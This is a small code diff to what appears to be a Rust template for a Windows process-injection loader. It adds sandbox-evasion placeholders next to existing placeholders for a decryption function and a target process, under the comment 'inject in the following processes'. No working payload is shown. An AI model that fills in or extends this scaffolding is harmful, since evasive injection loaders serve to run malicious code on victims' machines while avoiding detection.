@@ -25,6 +25,8 @@ use winapi::shared::ntdef::NULL;
 
 {{IMPORTS}}
 
+{{SANDBOX_IMPORTS}}
+
 {{DECRYPTION_FUNCTION}}
 
 fn boxboxbox(tar: &str) -> Vec<usize> {
@@ -84,6 +86,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 }
 
 fn main() {
+    {{SANDBOX}}
     // inject in the following processes:
     let tar: &str = "{{TARGET_PROCESS}}";
 
